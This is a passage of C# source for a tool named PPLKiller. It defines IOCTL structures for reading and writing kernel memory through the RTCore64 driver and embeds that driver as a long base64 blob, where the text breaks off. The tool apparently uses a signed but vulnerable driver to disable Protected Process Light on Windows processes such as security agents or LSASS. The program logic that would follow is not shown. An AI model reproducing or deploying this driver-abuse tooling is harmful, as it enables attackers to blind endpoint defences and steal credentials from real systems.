using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace PPLKiller
{
    public class Program
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct RTCORE64_MEMORY_READ
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Pad0;
            public ulong Address;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Pad1;
            public uint ReadSize;
            public uint Value;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Pad3;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct RTCORE64_MEMORY_WRITE
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Pad0;
            public ulong Address;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Pad1;
            public uint ReadSize;
            public uint Value;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Pad3;
        }

        public const uint RTCORE64_MEMORY_READ_CODE = 0x80002048;
        public const uint RTCORE64_MEMORY_WRITE_CODE = 0x8000204C;

        private const string ServiceName = "RTCore64";
		private static string Base64Driver = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXABEAG8AcwBEAGUAdgBpAGMAZQBzAFwAUgBUAEMAbwByAGUANgA0AAAAAAAAAAAAXABEAGUAdgBpAGMAZQBcAFIAVABDAG8AcgBlADYANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAANRAAAJggAABgEAAAExEAAKAgAAAgEQAAbhMAAKwgAACgEwAAHhQAAMAgAABQFAAAdRoAAPAgAACAGgAAlxoAANwgAACgGgAAtxoAAMggAADAGgAAXRsAACQhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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